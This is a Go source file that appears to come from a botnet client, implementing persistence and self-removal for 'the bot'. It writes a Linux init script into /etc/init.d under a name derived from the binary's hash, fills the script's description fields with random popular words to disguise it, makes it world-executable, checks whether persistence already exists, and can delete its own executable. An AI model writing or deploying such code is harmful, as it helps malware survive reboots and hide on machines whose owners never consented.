package main

import (
	"os"
	"time"
)

// Hash value of the bot's binary.
var selfHash string

// scriptNameBySelfHash generates a file name based on the bot's hash.
func scriptNameBySelfHash() (string, error) {
	return randomPopularWordBySeed(integersFromString(selfHash)+512) + "_" + randomPopularWordBySeed(integersFromString(selfHash)+1024), nil
}

// removeBinary deletes the bot's binary file.
func removeBinary() error {
	selfPath, err := os.Executable()
	if err != nil {
		return err
	}

	err = os.Remove(selfPath)
	if err != nil {
		return err
	}

	return nil
}

// checkIfPersisted returns true if it recognizes that the bot is already persistent within the environment.
func checkIfPersisted() bool {
	switch osDetails().Os {
	case "linux":
		scriptName, err := scriptNameBySelfHash()
		if err != nil {
			return false
		}

		_, err = os.Stat("/etc/init.d/" + scriptName)
		if err != nil {
			// We cannot make via LSBInitScripts.
			return false
		}

		return true
	}

	return false
}

// persist returns true if the executable was persisted within the environment.
func persist() error {
	switch osDetails().Os {
	case "linux":
		executablePath, err := os.Executable()
		if err != nil {
			// Couldn't get the full path of the bot's executable.
			return err
		}

		currentTime := time.Now().UnixNano()

		scriptContent := "#! /bin/sh"
		scriptContent += "\n### BEGIN INIT INFO"
		scriptContent += "\n# Provides:          " + randomPopularWord()
		scriptContent += "\n# Required-Start:    $local_fs"
		scriptContent += "\n# Required-Stop:     $local_fs"
		scriptContent += "\n# Default-Start:     2 3 4 5"
		scriptContent += "\n# Default-Stop:"
		scriptContent += "\n# Short-Description: "
		scriptContent += randomPopularWordBySeed(currentTime) + " "
		scriptContent += randomPopularWordBySeed(currentTime-2) + " "
		scriptContent += randomPopularWordBySeed(currentTime-4) + " "
		scriptContent += randomPopularWordBySeed(currentTime - 6)
		scriptContent += "\n# Description:       "
		scriptContent += randomPopularWordBySeed(currentTime-8) + " "
		scriptContent += randomPopularWordBySeed(currentTime-16) + " "
		scriptContent += randomPopularWordBySeed(currentTime-32) + " "
		scriptContent += randomPopularWordBySeed(currentTime-64) + " "
		scriptContent += randomPopularWordBySeed(currentTime-128) + " "
		scriptContent += randomPopularWordBySeed(currentTime - 256)
		scriptContent += "\n### END INIT INFO"
		scriptContent += "\n\n../.." + executablePath

		_, err = os.Stat("/etc/init.d")
		if err != nil {
			// We cannot make via LSBInitScripts.
			return err
		}

		scriptName, err := scriptNameBySelfHash()
		if err != nil {
			// Failed to generate the start up script's name.
			return err
		}
		scriptPath := "/etc/init.d/" + scriptName

		// Create our start up script.
		scriptFile, err := os.Create(scriptPath)
		if err != nil {
			// Failed to create the script file.
			return err
		}
		scriptFile.WriteString(scriptContent)

		if err := os.Chmod(scriptPath, 0777); err != nil {
			// We're unable to make the script executable.
			return err
		}

		return nil

	default:
		return nil
	}
}
